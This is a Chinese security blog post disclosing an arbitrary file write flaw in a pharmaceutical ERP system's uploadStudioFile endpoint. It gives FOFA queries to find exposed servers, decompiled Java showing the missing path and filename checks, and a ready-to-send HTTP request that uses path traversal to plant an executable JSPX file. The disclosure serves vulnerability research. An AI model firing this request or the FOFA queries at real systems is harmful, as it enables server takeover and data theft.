---
title: "北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞"
source: https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html
asset_dir: assets/北京时空智友erp系统-updater.uploadstudiofile-文件上传漏洞
---

# 北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/29 08:37
* 1240浏览
* [2评论](#comment)
* 41分钟阅读

深入探索

企业资源计划

SQL

身份验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

北京时空智友医药进销存ERP系统是一款面向医药行业的[企业资源计划](#)管理软件。该系统存在 updater.uploadStudioFile [文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，原因在于对上传文件缺乏有效的类型和权限校验，攻击者可通过构造恶意请求上传任意文件（如[WebShell](https://mrxn.net/tag/rce)）到服务器。利用该漏洞，攻击者可能获取服务器控制权限，导致敏感数据泄露、系统被篡改或植入后门，严重威胁企业信息安全。

企业资源规划

# fofa语法

```
app="时空智友-企业管理"
icon_hash="-1855198728" 
fid="IXXgtECT6as3EZE5r9If2w=="
```

# 漏洞分析

先看 `uploadStudioFile` 的业务逻辑实现如下

漏洞扫描服务

```
public String uploadStudioFile(HttpServletRequest var1, HttpServletResponse var2, InputStream var3) {
    String var20 = GeneralUtility.getParameter(var1, "content");
    InputSource var21;
    (var21 = new InputSource(new StringReader(var20))).setEncoding("UTF-8");
    Element var22;
    String var27 = (var22 = (new SAXReader()).read(var21).getRootElement()).element("filename").getTextTrim();
    String var4 = var22.element("filepath").getTextTrim();
    long var10 = Long.valueOf(var22.element("filesize").getTextTrim());
    String var23 = var22.element("lmtime").getTextTrim();
    long var13 = ((Date)c.parseObject(var23)).getTime();
    b();
    File var24;
    if (!(var24 = new File(e + "\\" + var4)).exists()) {
        var24.mkdirs();
    }

    File var25;
    (var25 = new File(var24, var27)).createNewFile();
    FileOutputStream var28 = null;
    boolean var17 = false;

    label131: {
        try {
            var17 = true;
            var28 = new FileOutputStream(var25);
            byte[] var6 = new byte[4096];

            int var5;
            while((var5 = var3.read(var6)) != -1) {
                var28.write(var6, 0, var5);
            }

            var28.flush();
            var28.close();
            var17 = false;
            break label131;
        } catch (Exception var18) {
            var26 = "<errmsg>" + var18.getMessage() + "</errmsg>";
            var17 = false;
        } finally {
            if (var17) {
                if (var28 != null) {
                    var28.flush();
                    var28.close();
                }

            }
        }

        if (var28 != null) {
            var28.flush();
            var28.close();
        }

        return var26;
    }

    var28.flush();
    var28.close();
    if (var25.length() != var10) {
        return "<errmsg>文件大小错误：" + var27 + "</errmsg>";
    } else {
        int var29 = 0;

        while(var25.lastModified() != var13) {
            ++var29;
            var25.setLastModified(var13);
            if (var25.lastModified() == var13 || var29 > 500) {
                break;
            }

            Thread.sleep(10L);
        }

        return var25.lastModified() != var13 ? "<errmsg>文件修改时间错误：" + var27 + "</errmsg>" : var27;
    }
}
```

该方法 `uploadStudioFile` 主要用于接收上传的文件数据，并根据传入的 XML 字符串内容，创建对应的文件路径和文件名，将输入流写入本地文件系统。其处理流程如下：

物流软件安全

首先，从 `HttpServletRequest` 中获取名为 `content` 的参数，该参数应为一个 XML 格式的字符串。接着，使用 `SAXReader` 解析该 XML 内容，获取根元素 `var22`。从根元素中提取 `filename`、`filepath`、`filesize` 和 `lmtime` 四个子元素的文本内容，分别用于构建目标文件名、路径、大小校验和最后修改时间。随后，根据 `filepath` 创建目标目录，若目录不存在则创建。接着，根据 `filename` 创建目标文件，并使用 `FileOutputStream` 将传入的 `InputStream` 数据写入该文件。在写入完成后，进行文件大小校验，若大小不一致则返回错误信息。最后，尝试设置文件的最后修改时间为 `lmtime` 转换后的时间戳，若设置失败则返回错误信息，否则返回文件名。

```
long var10 = Long.valueOf(var22.element("filesize").getTextTrim());
String var23 = var22.element("lmtime").getTextTrim();
long var13 = ((Date)c.parseObject(var23)).getTime();
```

主要是未对用户输入的 `filepath` 和 `filename` 进行合法性校验，攻击者可以通过构造恶意 XML 数据，指定任意路径和文件名，从而在服务器上写入任意文件，造成**[任意文件写入](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)**漏洞。同时 `content` 参数作为 XML 数据来源，未经过严格的格式验证和内容过滤，还存在 [XML 注入漏洞](https://mrxn.net/tag/XXE)，可以参考 [时空智友企业流程化管控系统 updater.startUpdateStudio XXE漏洞](https://mrxn.net/jswz/yonyou-updater-startUpdateStudio-xxe.html)

计算机服务器

整体执行流程大致如下图所示

[![北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞](images/img-001-4a01b3a2d002.webp)](https://image.mrxn.net/7047f77f2a94455582d336c98f23975a.webp)

# 漏洞复现

> 需要注意 content 后面所有内容的字符长度为其中 `<filesize>` 的值

```
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: skzy.mrxn.net
Content-Type: application/x-www-form-urlencoded

content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>
```

访问写入文件 `images/test.jspx` 即可

[![北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞](images/img-002-739ebafdbfef.webp)](https://image.mrxn.net/fede3235e88349489e4a24e9de3c3034.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞](https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html)  
文章链接：<https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机驱动器和存储设备

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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